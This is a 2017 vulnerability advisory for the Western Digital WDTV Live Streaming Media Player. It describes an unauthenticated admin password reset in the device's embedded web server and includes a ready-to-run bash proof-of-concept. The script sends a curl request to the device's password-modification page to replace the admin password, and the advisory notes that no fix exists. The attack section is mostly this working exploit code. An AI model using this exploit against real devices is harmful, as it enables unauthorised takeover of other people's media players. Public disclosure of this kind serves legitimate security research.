#######################################################
## WDTV Live SMP Remote Password Reset Vulnerability ##
#######################################################

Date: Jul 14 2017
Author: sw1tch
Demo: https://www.sw1tch.net/2017/07/12/wdtv-live-smb-exploit/
Description: A simple remotely exploitable web application vulnerability
for the WDTV Live Streaming Media Player and possibly other WDTV systems.

-INTRO-

The WDTV Live SMP is a is a consumer device produced by Western Digital
that plays videos, images, and music from USB drives. It can play
high-definition video through an HDMI port, and standard video through
composite video cables. It can play most common video and audio formats. As
of August 2016, the WDTV appears to be discontinued.

The latest firmware version appears to be 2.03.20.

-VULNERABILITY-

The WDTV Live SMP runs an embedded webserver, allowing authenticated users
to upload themes, manage device settings, access a virtual remote and other
tasks. To authenticate, a user needs to provide the correct password (no
username).

An unauthenticated attacker can update the password via a constructed GET
request, subsequently taking control of many functions of the device.

Vulnerable versions include at least firmware 2.03.20, and likely many more
older versions.

-POC-

#!/bin/bash

echo
echo "WDTV Live SMP Admin Password Reset Exploit"
echo "Apparently sw1tch found this guff in 2017"
echo
if [ $# != 2 ]; then
  echo "Usage: `basename $0` <target IP/host> <new password>"
echo
  exit $ERR_ARG
fi

# Vars...
target=$1
password=$2

echo -n "[*] Slamming your chosen password at $target now..."
curl "http://$target/DB/modfiy_pw.php" -d "password=$password"
echo "done!"
echo "[*] Try logging in to http://$target/ using $password"
echo
exit 0

-FIX-

None available. Device appears to be EOL so unlikely to be remediated.

--------------------------------------------------------------------------------------------------------------------------------